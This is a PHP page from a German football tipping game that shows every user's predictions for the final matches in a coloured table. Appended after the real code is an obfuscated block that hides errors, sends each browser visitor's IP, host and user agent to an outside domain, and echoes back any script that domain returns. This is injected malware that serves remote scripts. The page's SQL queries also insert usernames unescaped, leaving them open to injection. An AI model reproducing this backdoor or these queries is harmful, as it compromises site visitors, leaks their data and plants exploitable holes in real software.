<?php
session_start();
$userId=$_GET["userId"];
if(strlen($userId)==0)
{
	header("Location: ../util/login.php5");
	exit;
}
echo "<html>";
echo "<head>";
echo "<link rel='stylesheet' type='text/css' href='../../style/style.css' />";
echo "<br>";
echo "<a href='../util/login.php5'>zurück</a>";
echo "<br>";
echo "<br>";
echo "<title>Werke's Tippspiel - Tipps ALL USERS (Germany)</title>";
echo "</head>";
echo "<body>";
include_once("../../connection/dbaccess-local.php5");
include_once("../../general/log/log.php5");
include_once("../util/calc.php5");
include_once("../util/dbutil.php5");
include_once("../util/dbschema.php5");

$log=new viewlogger();
$log->info("clicked showAllUsersFinalmatchTipps.php5");


printFinalMatches();


function getUserInfo($username){
	$tableusers=dbschema::users;
	$sql="SELECT * from $tableusers WHERE username='$username'";
	$resultUser=mysql_query($sql);
	$array=mysql_fetch_array($resultUser);
	$firstname=$array["firstname"];
	$lastname=$array["lastname"];
	return "$firstname $lastname";
}

function printFinalMatches(){
	
	echo "<h3>Finalspiele</h3>";
	echo "<br>";
	$table_matches=dbschema::matches;
	$sql="SELECT * FROM $table_matches m WHERE m.matchtype!='Gruppenspiel'";
	$sqlResult=mysql_query($sql);
	
	echo "<table border='1' rules='all'>";
	echo "<tr>";
	echo "<th>Spiel</th> ";
	while($array=mysql_fetch_array($sqlResult)){
		
		$matchnr = $array["matchnr"];
		echo "<th align='center'> $matchnr </th>";
	}
	echo "</tr>";
	
	$table_users=dbschema::users;
	$sql="SELECT * FROM $table_users t ORDER BY lastname,firstname";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		echo "<tr>";
		printFinalMatchesForUser($array["username"]);
		echo "</tr>";
	}
	echo "</table>";
}
function printFinalMatchesForUser($username){
	
	$table_matches=dbschema::matches;
	$table_users=dbschema::users;
	$table_tipps=dbschema::finalmatchtipps;
	echo "<tr>";
	echo "<td>" . getUserInfo($username) . "</td>";
	$sql="SELECT * FROM $table_matches m LEFT JOIN $table_tipps t ON m.matchnr=t.matchnr AND t.user='$username' WHERE m.matchtype!='Gruppenspiel' ";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		$matchnr=$array["matchnr"];
		$teamName1=$array["teamX"];
		$teamName2=$array["teamY"];
		$tippGoalsTeam1=$array["goalsX"]; if (strlen($tippGoalsTeam1)==0) $tippGoalsTeam1='&nbsp; ';
		$tippGoalsTeam2=$array["goalsY"]; if (strlen($tippGoalsTeam2)==0) $tippGoalsTeam2='&nbsp; ';
		$points = $array["score"];
		$evaluationDone=$array["evaluationDone"];
		
		$result = "$teamName1-$teamName2<br>$tippGoalsTeam1 : $tippGoalsTeam2";
		if($evaluationDone === "T"){
			if($points == NULL){ // for the user 'real'
				echo "<td align='center'>$result</td>";
			} else if($points == 0){ // print white
				echo "<td><div align='center' style=\"background-color:white\">$result</div></td>";
			} else if($points == 2){ // print light blue
				echo "<td><div align='center' style=\"background-color:CCFFFF\">$result</div></td>";
			} else if($points == 3){ // print light blue (a bit darker)
				echo "<td><div align='center' style=\"background-color:99ffff\">$result</div></td>";
			} else if($points == 4){ // print light green
				echo "<td><div align='center' style=\"background-color:CCFF99\">$result</div></td>";
			} else if($points == 5){ // print light green (a bit darker)
				echo "<td><div align='center' style=\"background-color:b7e589\">$result</div></td>";
			} else if($points == 6){ // print light green (even a bit more shade)
				echo "<td><div align='center' style=\"background-color:a3cc7a\">$result</div></td>";
			} else if($points == 8){ // print green
				echo "<td><div align='center' style=\"background-color:8eb26b\">$result</div></td>";
			}
		} else {
			echo "<td align='center'>$result</td>";
		}
	}
	echo "</tr>";
}

?>
<?php
#f19e34#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/f19e34#
?>
